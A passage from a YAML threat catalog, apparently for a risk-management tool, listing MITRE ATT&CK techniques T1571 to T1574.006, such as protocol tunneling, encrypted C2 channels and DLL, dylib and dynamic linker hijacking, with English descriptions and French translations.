        description: "Les adversaires peuvent communiquer en utilisant un protocole\
          \ et un port associ\xE9 qui ne sont g\xE9n\xE9ralement pas associ\xE9s.\
          \ Par exemple, HTTPS sur le port 8088 (Citation : Symantec Elfin Mar 2019)\
          \ ou le port 587 (Citation : Fortinet Agent Tesla avril 2018) par opposition\
          \ au port traditionnel 443. Les adversaires peuvent modifier le port standard\
          \ utilis\xE9 par un protocole pour contourner le filtrage ou brouiller l\u2019\
          analyse/analyse des donn\xE9es r\xE9seau.\n\nLes adversaires peuvent \xE9\
          galement modifier les syst\xE8mes des victimes pour abuser des ports non\
          \ standards. Par exemple, les cl\xE9s de registre et d\u2019autres param\xE8\
          tres de configuration peuvent \xEAtre utilis\xE9s pour modifier les paires\
          \ protocole et port. (Citation : change_rdp_port_conti)\nhttps://attack.mitre.org/techniques/T1571"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1572
    ref_id: T1572
    name: Protocol Tunneling
    description: "Adversaries may tunnel network communications to and from a victim\
      \ system within a separate protocol to avoid detection/network filtering and/or\
      \ enable access to otherwise unreachable systems. Tunneling involves explicitly\
      \ encapsulating a protocol within another. This behavior may conceal malicious\
      \ traffic by blending in with existing traffic and/or provide an outer layer\
      \ of encryption (similar to a VPN). Tunneling could also enable routing of network\
      \ packets that would otherwise not reach their intended destination, such as\
      \ SMB, RDP, or other traffic that would be filtered by network appliances or\
      \ not routed over the Internet. \n\nThere are various means to encapsulate a\
      \ protocol within another protocol. For example, adversaries may perform SSH\
      \ tunneling (also known as SSH port forwarding), which involves forwarding arbitrary\
      \ data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia\
      \ Abyss Locker 2025) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572)\
      \ may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568).\
      \ Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be\
      \ encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua\
      \ JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)\
      \ in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or\
      \ [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003)\
      \ to further conceal C2 communications and infrastructure."
    translations:
      fr:
        name: Tunneling de protocole
        description: "Les adversaires peuvent tunneler les communications r\xE9seau\
          \ vers et depuis un syst\xE8me victime au sein d\u2019un protocole distinct\
          \ afin d\u2019\xE9viter la d\xE9tection/filtrage r\xE9seau et/ou d\u2019\
          acc\xE9der \xE0 des syst\xE8mes autrement inaccessibles. Le tunneling consiste\
          \ \xE0 encapsuler explicitement un protocole dans un autre. Ce comportement\
          \ peut dissimuler un trafic malveillant en se fondant dans le trafic existant\
          \ et/ou fournir une couche externe de chiffrement (similaire \xE0 un VPN).\
          \ Le tunneling pouvait \xE9galement permettre le routage de paquets r\xE9\
          seau qui n\u2019atteindraient autrement pas leur destination pr\xE9vue,\
          \ tels que SMB, RDP, ou tout autre trafic filtr\xE9 par des appareils r\xE9\
          seau ou non achemin\xE9 sur Internet. \n\nIl existe plusieurs moyens d\u2019\
          encapsuler un protocole dans un autre protocole. Par exemple, les adversaires\
          \ peuvent effectuer un tunneling SSH (\xE9galement appel\xE9 transfert de\
          \ port SSH), qui consiste \xE0 transf\xE9rer des donn\xE9es arbitraires\
          \ via un tunnel SSH chiffr\xE9. (Citation : Tunnel SSH)(Citation : Sygnia\
          \ Abyss Locker 2025) \n\n[Tunnel de protocole](https://attack.mitre.org/techniques/T1572)\
          \ peut \xE9galement \xEAtre abus\xE9 par des adversaires lors de [R\xE9\
          solution dynamique](https://attack.mitre.org/techniques/T1568). Appel\xE9\
          es DNS sur HTTPS (DoH), les requ\xEAtes pour r\xE9soudre l\u2019infrastructure\
          \ C2 peuvent \xEAtre encapsul\xE9es dans des paquets HTTPS chiffr\xE9s.\
          \ (Citation : BleepingComp Godlua JUIL19) \n\nLes adversaires peuvent \xE9\
          galement utiliser [Tunneling de protocole](https://attack.mitre.org/techniques/T1572)\
          \ en conjonction avec [Proxy](https://attack.mitre.org/techniques/T1090)\
          \ et/ou [Usurpation d\u2019identit\xE9 de protocole ou de service](https://attack.mitre.org/techniques/T1001/003)\
          \ pour dissimuler davantage les communications et infrastructures C2."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573
    ref_id: T1573
    name: Encrypted Channel
    description: 'Adversaries may employ an encryption algorithm to conceal command
      and control traffic rather than relying on any inherent protections provided
      by a communication protocol. Despite the use of a secure algorithm, these implementations
      may be vulnerable to reverse engineering if secret keys are encoded and/or generated
      within malware samples/configuration files.

      https://attack.mitre.org/techniques/T1573'
    translations:
      fr:
        name: "Canal chiffr\xE9"
        description: "Les adversaires peuvent utiliser un algorithme de chiffrement\
          \ pour dissimuler le trafic de commandement et de contr\xF4le plut\xF4t\
          \ que de s\u2019appuyer sur des protections inh\xE9rentes fournies par un\
          \ protocole de communication. Malgr\xE9 l\u2019utilisation d\u2019un algorithme\
          \ s\xE9curis\xE9, ces impl\xE9mentations peuvent \xEAtre vuln\xE9rables\
          \ \xE0 l\u2019ing\xE9nierie inverse si des cl\xE9s secr\xE8tes sont encod\xE9\
          es et/ou g\xE9n\xE9r\xE9es dans des \xE9chantillons de malware/fichiers\
          \ de configuration.\nhttps://attack.mitre.org/techniques/T1573"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573.001
    ref_id: T1573.001
    name: Symmetric Cryptography
    description: 'Adversaries may employ a known symmetric encryption algorithm to
      conceal command and control traffic rather than relying on any inherent protections
      provided by a communication protocol. Symmetric encryption algorithms use the
      same key for plaintext encryption and ciphertext decryption. Common symmetric
      encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.

      https://attack.mitre.org/techniques/T1573/001'
    translations:
      fr:
        name: "Cryptographie sym\xE9trique"
        description: "Les adversaires peuvent employer un algorithme de chiffrement\
          \ sym\xE9trique connu pour dissimuler le trafic de commandement et de contr\xF4\
          le plut\xF4t que de s\u2019appuyer sur des protections inh\xE9rentes fournies\
          \ par un protocole de communication. Les algorithmes de chiffrement sym\xE9\
          trique utilisent la m\xEAme cl\xE9 pour le chiffrement du texte clair et\
          \ le d\xE9chiffrement du texte chiffr\xE9. Les algorithmes de chiffrement\
          \ sym\xE9trique courants incluent AES, DES, 3DES, Blowfish et RC4.\nhttps://attack.mitre.org/techniques/T1573/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573.002
    ref_id: T1573.002
    name: Asymmetric Cryptography
    description: "Adversaries may employ a known asymmetric encryption algorithm to\
      \ conceal command and control traffic rather than relying on any inherent protections\
      \ provided by a communication protocol. Asymmetric cryptography, also known\
      \ as public key cryptography, uses a keypair per party: one public that can\
      \ be freely distributed, and one private. Due to how the keys are generated,\
      \ the sender encrypts data with the receiver\u2019s public key and the receiver\
      \ decrypts the data with their private key. This ensures that only the intended\
      \ recipient can read the encrypted data. Common public key encryption algorithms\
      \ include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS)\
      \ use symmetric cryptography once a connection is established, but use asymmetric\
      \ cryptography to establish or transmit a key. As such, these protocols are\
      \ classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)."
    translations:
      fr:
        name: "Cryptographie asym\xE9trique"
        description: "Les adversaires peuvent employer un algorithme de chiffrement\
          \ asym\xE9trique connu pour dissimuler le trafic de commandement et de contr\xF4\
          le plut\xF4t que de s\u2019appuyer sur des protections inh\xE9rentes fournies\
          \ par un protocole de communication. La cryptographie asym\xE9trique, \xE9\
          galement appel\xE9e cryptographie \xE0 cl\xE9 publique, utilise une paire\
          \ de cl\xE9s par partie : une publique pouvant \xEAtre librement distribu\xE9\
          e, et une priv\xE9e. En raison de la mani\xE8re dont les cl\xE9s sont g\xE9\
          n\xE9r\xE9es, l\u2019exp\xE9diteur chiffre les donn\xE9es avec la cl\xE9\
          \ publique du destinataire et le destinataire d\xE9chiffre les donn\xE9\
          es avec sa cl\xE9 priv\xE9e. Cela garantit que seul le destinataire vis\xE9\
          \ peut lire les donn\xE9es chiffr\xE9es. Les algorithmes de chiffrement\
          \ \xE0 cl\xE9 publique courants incluent RSA et ElGamal.\n\nPour plus d\u2019\
          efficacit\xE9, de nombreux protocoles (y compris SSL/TLS) utilisent la cryptographie\
          \ sym\xE9trique une fois la connexion \xE9tablie, mais utilisent une cryptographie\
          \ asym\xE9trique pour \xE9tablir ou transmettre une cl\xE9. Ainsi, ces protocoles\
          \ sont class\xE9s sous le nom de [Cryptographie asym\xE9trique](https://attack.mitre.org/techniques/T1573/002)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574
    ref_id: T1574
    name: Hijack Execution Flow
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the way operating systems run programs. Hijacking execution flow can be for
      the purposes of persistence, since this hijacked execution may reoccur over
      time. Adversaries may also use these mechanisms to elevate privileges or evade
      defenses, such as application control or other restrictions on execution.


      There are many ways an adversary may hijack the flow of execution, including
      by manipulating how the operating system locates programs to be executed. How
      the operating system locates libraries to be used by a program can also be intercepted.
      Locations where the operating system looks for programs/resources, such as file
      directories and in the case of Windows the Registry, could also be poisoned
      to include malicious payloads.

      https://attack.mitre.org/techniques/T1574'
    translations:
      fr:
        name: "Flux d\u2019ex\xE9cution de d\xE9tournement"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant la fa\xE7on dont les syst\xE8mes d\u2019\
          exploitation ex\xE9cutent les programmes. Le d\xE9tournement du flux d\u2019\
          ex\xE9cution peut \xEAtre utilis\xE9 pour des fins de persistance, car cette\
          \ ex\xE9cution d\xE9tourn\xE9e peut se reproduire dans le temps. Les adversaires\
          \ peuvent \xE9galement utiliser ces m\xE9canismes pour \xE9lever des privil\xE8\
          ges ou contourner des d\xE9fenses, telles que le contr\xF4le des applications\
          \ ou d\u2019autres restrictions d\u2019ex\xE9cution.\n\nIl existe de nombreuses\
          \ fa\xE7ons pour un adversaire de d\xE9tourner le flux d\u2019ex\xE9cution,\
          \ notamment en manipulant la mani\xE8re dont le syst\xE8me d\u2019exploitation\
          \ localise les programmes \xE0 ex\xE9cuter. La fa\xE7on dont le syst\xE8\
          me d\u2019exploitation localise les biblioth\xE8ques \xE0 utiliser par un\
          \ programme peut \xE9galement \xEAtre intercept\xE9e. Les emplacements o\xF9\
          \ le syst\xE8me d\u2019exploitation recherche des programmes/ressources,\
          \ tels que les r\xE9pertoires de fichiers et, dans le cas de Windows, le\
          \ Registre, peuvent \xE9galement \xEAtre empoisonn\xE9s pour inclure des\
          \ charges utiles malveillantes.\nhttps://attack.mitre.org/techniques/T1574"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.001
    ref_id: T1574.001
    name: DLL
    description: "Adversaries may abuse dynamic-link library files (DLLs) in order\
      \ to achieve persistence, escalate privileges, and evade defenses. DLLs are\
      \ libraries that contain code and data that can be simultaneously utilized by\
      \ multiple programs. While DLLs are not malicious by nature, they can be abused\
      \ through mechanisms such as side-loading, hijacking search order, and phantom\
      \ DLL hijacking.(Citation: unit 42)\n\nSpecific ways DLLs are abused by adversaries\
      \ include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious\
      \ payloads by side-loading DLLs. Side-loading involves hijacking which DLL a\
      \ program loads by planting and then invoking a legitimate application that\
      \ executes their payload(s).\n\nSide-loading positions both the victim application\
      \ and malicious payload(s) alongside each other. Adversaries likely use side-loading\
      \ as a means of masking actions they perform under a legitimate, trusted, and\
      \ potentially elevated system or software process. Benign executables used to\
      \ side-load payloads may not be flagged during delivery and/or execution. Adversary\
      \ payloads may also be encrypted/packed or otherwise obfuscated until loaded\
      \ into the memory of the trusted process.\n\nAdversaries may also side-load\
      \ other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)\n\
      \nAdversaries may chain DLL sideloading multiple times to fragment functionality\
      \ hindering analysis. Adversaries using multiple DLL files can split the loader\
      \ functions across different DLLs, with a main DLL loading the separated export\
      \ functions. (Citation: Virus Bulletin) Spreading loader functions across multiple\
      \ DLLs makes analysis harder, since all files must be collected to fully understand\
      \ the malware\u2019s behavior.  Another method implements a \u201Cloader-for-a-loader\u201D\
      , where a malicious DLL\u2019s sole role is to load a second DLL (or a chain\
      \ of DLLs) that contain the real payload. (Citation: Sophos)\n\n### DLL Search\
      \ Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking\
      \ the search order that Windows uses to load DLLs. This search order is a sequence\
      \ of special and standard search locations that a program checks when loading\
      \ a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized\
      \ by the DLL search order over the location of a legitimate library. This will\
      \ cause Windows to load the malicious DLL when it is called for by the victim\
      \ program.(Citation: unit 42)\n\n### DLL Redirection\nAdversaries may directly\
      \ modify the search order via DLL redirection, which after being enabled (in\
      \ the Registry or via the creation of a redirection file) may cause a program\
      \ to load a DLL from a different location.(Citation: Microsoft redirection)(Citation:\
      \ Microsoft - manifests/assembly)\n\n### Phantom DLL Hijacking\nAdversaries\
      \ may leverage phantom DLL hijacking by targeting references to non-existent\
      \ DLL files. They may be able to load their own malicious DLL by planting it\
      \ with the correct name in the location of the missing module.(Citation: Hexacorn\
      \ DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)\n\n### DLL Substitution\n\
      Adversaries may target existing, valid DLL files and substitute them with their\
      \ own malicious DLLs, planting them with the same name and in the same location\
      \ as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)\n\nPrograms\
      \ that fall victim to DLL hijacking may appear to behave normally because malicious\
      \ DLLs may be configured to also load the legitimate DLLs they were meant to\
      \ replace, evading defenses.\n\nRemote DLL hijacking can occur when a program\
      \ sets its current directory to a remote location, such as a Web share, before\
      \ loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)\n\
      \nIf a valid DLL is configured to run at a higher privilege level, then the\
      \ adversary-controlled DLL that is loaded will also be executed at the higher\
      \ level. In this case, the technique could be used for privilege escalation.\n\
      https://attack.mitre.org/techniques/T1574/001"
    translations:
      fr:
        name: DLL
        description: "Les attaquants peuvent exploiter les fichiers de biblioth\xE8\
          ques de liens dynamiques (DLL) afin d\u2019assurer leur persistance, d\u2019\
          \xE9lever leurs privil\xE8ges et de contourner les d\xE9fenses. Les DLL\
          \ sont des biblioth\xE8ques contenant du code et des donn\xE9es pouvant\
          \ \xEAtre utilis\xE9es simultan\xE9ment par plusieurs programmes. Bien que\
          \ les DLL ne soient pas malveillantes par nature, elles peuvent faire l\u2019\
          objet d\u2019abus par le biais de m\xE9canismes tels que le chargement lat\xE9\
          ral, le d\xE9tournement de l\u2019ordre de recherche et le d\xE9tournement\
          \ de DLL fant\xF4mes. (Source : Unit 42)\n\nVoici quelques exemples concrets\
          \ d\u2019utilisation abusive des DLL par les attaquants :\n\n### Side-loading\
          \ des DLL\nLes attaquants peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes par le biais du side-loading de DLL. Le side-loading consiste\
          \ \xE0 d\xE9tourner la DLL charg\xE9e par un programme en implantant, puis\
          \ en lan\xE7ant, une application l\xE9gitime qui ex\xE9cute leur(s) charge(s)\
          \ utile(s).\n\nLe chargement lat\xE9ral place l\u2019application victime\
          \ et la ou les charges utiles malveillantes c\xF4te \xE0 c\xF4te. Les attaquants\
          \ utilisent probablement le chargement lat\xE9ral pour masquer les actions\
          \ qu\u2019ils effectuent sous le couvert d\u2019un processus syst\xE8me\
          \ ou logiciel l\xE9gitime, de confiance et potentiellement dot\xE9 de privil\xE8\
          ges \xE9lev\xE9s. Les ex\xE9cutables inoffensifs utilis\xE9s pour le chargement\
          \ lat\xE9ral des charges utiles peuvent ne pas \xEAtre d\xE9tect\xE9s lors\
          \ de leur distribution et/ou de leur ex\xE9cution. Les charges utiles des\
          \ attaquants peuvent \xE9galement \xEAtre chiffr\xE9es, compress\xE9es ou\
          \ obscurcies d\u2019une autre mani\xE8re jusqu\u2019\xE0 ce qu\u2019elles\
          \ soient charg\xE9es dans la m\xE9moire du processus de confiance.\n\nLes\
          \ attaquants peuvent \xE9galement proc\xE9der au chargement lat\xE9ral d\u2019\
          autres paquets, tels que les BPL (Borland Package Library). (R\xE9f\xE9\
          rence : kroll bpl)\n\nLes attaquants peuvent encha\xEEner plusieurs fois\
          \ le sideloading de DLL afin de fragmenter les fonctionnalit\xE9s et de\
          \ compliquer l\u2019analyse. Ceux qui utilisent plusieurs fichiers DLL peuvent\
          \ r\xE9partir les fonctions de chargement entre diff\xE9rentes DLL, une\
          \ DLL principale se chargeant de charger les fonctions d\u2019exportation\
          \ s\xE9par\xE9es. (Source : Virus Bulletin) La r\xE9partition des fonctions\
          \ de chargement entre plusieurs DLL rend l\u2019analyse plus difficile,\
          \ car tous les fichiers doivent \xEAtre collect\xE9s pour comprendre pleinement\
          \ le comportement du logiciel malveillant.  Une autre m\xE9thode consiste\
          \ \xE0 mettre en \u0153uvre un \xAB chargeur pour un chargeur \xBB, o\xF9\
          \ le seul r\xF4le d\u2019une DLL malveillante est de charger une deuxi\xE8\
          me DLL (ou une cha\xEEne de DLL) contenant la v\xE9ritable charge utile.\
          \ (Source : Sophos)\n\n### D\xE9tournement de l\u2019ordre de recherche\
          \ des DLL\nLes attaquants peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant l\u2019ordre de recherche utilis\xE9 par\
          \ Windows pour charger les DLL. Cet ordre de recherche est une s\xE9quence\
          \ d\u2019emplacements de recherche sp\xE9ciaux et standard qu\u2019un programme\
          \ v\xE9rifie lors du chargement d\u2019une DLL. Un attaquant peut placer\
          \ une DLL de type cheval de Troie dans un r\xE9pertoire qui sera prioris\xE9\
          \ par l\u2019ordre de recherche des DLL par rapport \xE0 l\u2019emplacement\
          \ d\u2019une biblioth\xE8que l\xE9gitime. Cela entra\xEEnera le chargement\
          \ de la DLL malveillante par Windows lorsqu\u2019elle sera sollicit\xE9\
          e par le programme de la victime. (Source : Unit 42)\n\n### Redirection\
          \ de DLL\nLes attaquants peuvent modifier directement l\u2019ordre de recherche\
          \ via la redirection de DLL, qui, une fois activ\xE9e (dans le Registre\
          \ ou via la cr\xE9ation d\u2019un fichier de redirection), peut amener un\
          \ programme \xE0 charger une DLL \xE0 partir d\u2019un emplacement diff\xE9\
          rent. (R\xE9f\xE9rence : redirection Microsoft) (R\xE9f\xE9rence : Microsoft\
          \ - manifests/assembly)\n\n### D\xE9tournement de DLL fant\xF4mes\nLes attaquants\
          \ peuvent recourir au d\xE9tournement de DLL fant\xF4mes en ciblant des\
          \ r\xE9f\xE9rences \xE0 des fichiers DLL inexistants. Ils peuvent ainsi\
          \ charger leur propre DLL malveillante en la pla\xE7ant, sous le nom correct,\
          \ \xE0 l\u2019emplacement du module manquant. (R\xE9f\xE9rence : Hexacorn\
          \ DLL Hijacking) (R\xE9f\xE9rence : Hijack DLLs CrowdStrike)\n\n### Substitution\
          \ de DLL\nLes attaquants peuvent cibler des fichiers DLL existants et valides\
          \ pour les remplacer par leurs propres DLL malveillantes, en les pla\xE7\
          ant sous le m\xEAme nom et au m\xEAme emplacement que le fichier DLL valide.\
          \ (R\xE9f\xE9rence : Wietze Beukema, \xAB DLL Hijacking \xBB)\n\nLes programmes\
          \ victimes d\u2019un d\xE9tournement de DLL peuvent sembler fonctionner\
          \ normalement, car les DLL malveillantes peuvent \xEAtre configur\xE9es\
          \ pour charger \xE9galement les DLL l\xE9gitimes qu\u2019elles sont cens\xE9\
          es remplacer, contournant ainsi les d\xE9fenses.\n\nUn d\xE9tournement de\
          \ DLL \xE0 distance peut se produire lorsqu\u2019un programme d\xE9finit\
          \ son r\xE9pertoire courant sur un emplacement distant, tel qu\u2019un partage\
          \ Web, avant de charger une DLL. (R\xE9f\xE9rence : \xAB dll pre load owasp\
          \ \xBB) (R\xE9f\xE9rence : \xAB microsoft remote preloading \xBB)\n\nSi\
          \ une DLL valide est configur\xE9e pour s'ex\xE9cuter avec un niveau de\
          \ privil\xE8ge sup\xE9rieur, la DLL contr\xF4l\xE9e par l'attaquant qui\
          \ est charg\xE9e sera \xE9galement ex\xE9cut\xE9e \xE0 ce niveau sup\xE9\
          rieur. Dans ce cas, cette technique pourrait \xEAtre utilis\xE9e pour l'\xE9\
          l\xE9vation de privil\xE8ges.\nhttps://attack.mitre.org/techniques/T1574/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.004
    ref_id: T1574.004
    name: Dylib Hijacking
    description: 'Adversaries may execute their own payloads by placing a malicious
      dynamic library (dylib) with an expected name in a path a victim application
      searches at runtime. The dynamic loader will try to find the dylibs based on
      the sequential order of the search paths. Paths to dylibs may be prefixed with
      <code>@rpath</code>, which allows developers to use relative paths to specify
      an array of search paths used at runtime based on the location of the executable.  Additionally,
      if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function,
      an application will still execute even if an expected dylib is not present.
      Weak linking enables developers to run an application on multiple macOS versions
      as new APIs are added.


      Adversaries may gain execution by inserting malicious dylibs with the name of
      the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable
      Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject
      HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are
      loaded into an application''s address space allowing the malicious dylib to
      inherit the application''s privilege level and resources. Based on the application,
      this could result in privilege escalation and uninhibited network access. This
      method may also evade detection from security products since the execution is
      masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation:
      wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection
      MachO)

      https://attack.mitre.org/techniques/T1574/004'
    translations:
      fr:
        name: "D\xE9tournement de Dylib"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ en pla\xE7ant une biblioth\xE8que dynamique malveillante (dylib) avec\
          \ un nom attendu dans un chemin qu\u2019une application victime recherche\
          \ \xE0 l\u2019ex\xE9cution. Le chargeur dynamique essaiera de trouver les\
          \ dylibs en se basant sur l\u2019ordre s\xE9quentiel des chemins de recherche.\
          \ Les chemins vers les dylibs peuvent \xEAtre pr\xE9c\xE9d\xE9s de <code>@rpath</code>,\
          \ ce qui permet aux d\xE9veloppeurs d\u2019utiliser des chemins relatifs\
          \ pour sp\xE9cifier un tableau de chemins de recherche utilis\xE9s \xE0\
          \ l\u2019ex\xE9cution en fonction de l\u2019emplacement de l\u2019ex\xE9\
          cutable.  De plus, si un lien faible est utilis\xE9, comme la fonction <code>LC_LOAD_WEAK_DYLIB</code>,\
          \ une application s\u2019ex\xE9cutera m\xEAme si une dylib attendue n\u2019\
          est pas pr\xE9sente. Le lien faible permet aux d\xE9veloppeurs d\u2019ex\xE9\
          cuter une application sur plusieurs versions de macOS au fur et \xE0 mesure\
          \ que de nouvelles API sont ajout\xE9es.\n\nLes adversaires peuvent obtenir\
          \ l\u2019ex\xE9cution en ins\xE9rant des dylibs malveillants portant le\
          \ nom du dylib manquant dans le chemin identifi\xE9. (Citation : Wardle\
          \ Dylib d\xE9tourne des applications vuln\xE9rables)(Citation : D\xE9tournement\
          \ de l\u2019OSX par Wardle Dylib 2015)(Citation : Github EmpireProject HijackScanner)(Citation\
          \ : Github Empire Project CreateHijacker Dylib) Les dylibs sont charg\xE9\
          s dans l\u2019espace d\u2019adressage d\u2019une application, permettant\
          \ au dylib malveillant d\u2019h\xE9riter du niveau de privil\xE8ge et des\
          \ ressources de l\u2019application. Selon l\u2019application, cela pourrait\
          \ entra\xEEner une escalade des privil\xE8ges et un acc\xE8s r\xE9seau sans\
          \ entrave. Cette m\xE9thode peut \xE9galement \xE9chapper \xE0 la d\xE9\
          tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution est masqu\xE9\
          e par un processus l\xE9gitime. (Citation : \xC9crire de mauvais malwares\
          \ pour OSX)(Citation : wardle artofmalware volume 1)(Citation : MalwareUnicorn\
          \ macOS Dylib Injection MachO)\nhttps://attack.mitre.org/techniques/T1574/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.005
    ref_id: T1574.005
    name: Executable Installer File Permissions Weakness
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the binaries used by an installer. These processes may automatically execute
      specific binaries as part of their functionality or to perform other actions.
      If the permissions on the file system directory containing a target binary,
      or permissions on the binary itself, are improperly set, then the target binary
      may be overwritten with another binary using user-level permissions and executed
      by the original process. If the original process and thread are running under
      a higher permissions level, then the replaced binary will also execute under
      higher-level permissions, which could include SYSTEM.


      Another variation of this technique can be performed by taking advantage of
      a weakness that is common in executable, self-extracting installers. During
      the installation process, it is common for installers to use a subdirectory
      within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs,
      or other payloads. When installers create subdirectories and files they often
      do not set appropriate permissions to restrict write access, which allows for
      execution of untrusted code placed in the subdirectories or overwriting of binaries
      used in the installation process. This behavior is related to and may take advantage
      of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.


      Adversaries may use this technique to replace legitimate binaries with malicious
      ones as a means of executing code at a higher permissions level. Some installers
      may also require elevated privileges that will result in privilege escalation
      when executing adversary controlled code. This behavior is related to [Bypass
      User Account Control](https://attack.mitre.org/techniques/T1548/002). Several
      examples of this weakness in existing common installers have been reported to
      software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers
      are Vulnerable) If the executing process is set to run at a specific time or
      during a certain event (e.g., system bootup) then this technique can also be
      used for persistence.

      https://attack.mitre.org/techniques/T1574/005'
    translations:
      fr:
        name: "Faiblesse des permissions des fichiers d\u2019installation ex\xE9cutables"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les binaires utilis\xE9s par un installateur.\
          \ Ces processus peuvent ex\xE9cuter automatiquement des binaires sp\xE9\
          cifiques dans le cadre de leur fonctionnalit\xE9 ou pour effectuer d\u2019\
          autres actions. Si les permissions sur le r\xE9pertoire du syst\xE8me de\
          \ fichiers contenant un binaire cible, ou les permissions sur le binaire\
          \ lui-m\xEAme, sont mal d\xE9finies, alors le binaire cible peut \xEAtre\
          \ \xE9cras\xE9 par un autre binaire utilisant les permissions au niveau\
          \ utilisateur et ex\xE9cut\xE9 par le processus d\u2019origine. Si le processus\
          \ et le thread d\u2019origine s\u2019ex\xE9cutent sous un niveau d\u2019\
          autorisations sup\xE9rieur, alors le binaire remplac\xE9 s\u2019ex\xE9cutera\
          \ \xE9galement sous des permissions de niveau sup\xE9rieur, ce qui peut\
          \ inclure SYSTEM.\n\nUne autre variante de cette technique peut \xEAtre\
          \ r\xE9alis\xE9e en exploitant une faiblesse courante chez les installateurs\
          \ ex\xE9cutables et auto-extractibles. Pendant le processus d\u2019installation,\
          \ il est courant que les installateurs utilisent un sous-r\xE9pertoire au\
          \ sein du <code>r\xE9pertoire %TEMP\_%</code> pour d\xE9compresser des binaires\
          \ tels que les DLL, les EXE ou d\u2019autres charges utiles. Lorsque les\
          \ installateurs cr\xE9ent des sous-r\xE9pertoires et des fichiers, ils ne\
          \ d\xE9finissent souvent pas les autorisations appropri\xE9es pour restreindre\
          \ l\u2019acc\xE8s en \xE9criture, ce qui permet l\u2019ex\xE9cution de code\
          \ non fiable plac\xE9 dans les sous-r\xE9pertoires ou la r\xE9\xE9criture\
          \ des binaires utilis\xE9s dans le processus d\u2019installation. Ce comportement\
          \ est li\xE9 au d\xE9tournement de l\u2019ordre de recherche [DLL](https://attack.mitre.org/techniques/T1574/001).\n\
          \nLes adversaires peuvent utiliser cette technique pour remplacer des binaires\
          \ l\xE9gitimes par des binaires malveillants afin d\u2019ex\xE9cuter du\
          \ code \xE0 un niveau d\u2019autorisations sup\xE9rieur. Certains installateurs\
          \ peuvent \xE9galement exiger des privil\xE8ges \xE9lev\xE9s qui entra\xEE\
          neront une escalade de privil\xE8ges lors de l\u2019ex\xE9cution de code\
          \ contr\xF4l\xE9 par l\u2019adversaire. Ce comportement est li\xE9 \xE0\
          \ [Contourner le contr\xF4le du compte utilisateur](https://attack.mitre.org/techniques/T1548/002).\
          \ Plusieurs exemples de cette faiblesse chez les installateurs courants\
          \ existants ont \xE9t\xE9 signal\xE9s aux fournisseurs de logiciels. (Citation\
          \ : mozilla_sec_adv_2012)  (Citation : Les installateurs ex\xE9cutables\
          \ sont vuln\xE9rables) Si le processus en ex\xE9cution est configur\xE9\
          \ pour s\u2019ex\xE9cuter \xE0 un moment pr\xE9cis ou lors d\u2019un certain\
          \ \xE9v\xE9nement (par exemple, d\xE9marrage du syst\xE8me), cette technique\
          \ peut \xE9galement \xEAtre utilis\xE9e pour la persistance.\nhttps://attack.mitre.org/techniques/T1574/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.006
    ref_id: T1574.006
    name: Dynamic Linker Hijacking
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables the dynamic linker uses to load shared libraries. During\
      \ the execution preparation phase of a program, the dynamic linker loads specified\
      \ absolute paths of shared libraries from various environment variables and\
      \ files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code>\
      \ on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation:\
      \ Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment\
      \ variables are loaded first, taking precedence over system libraries with the\
      \ same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation:\
      \ Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive\
      \ list of environment variables at different points in execution. These variables\
      \ are often used by developers to debug binaries without needing to recompile,\
      \ deconflict mapped symbols, and implement custom functions in the original\
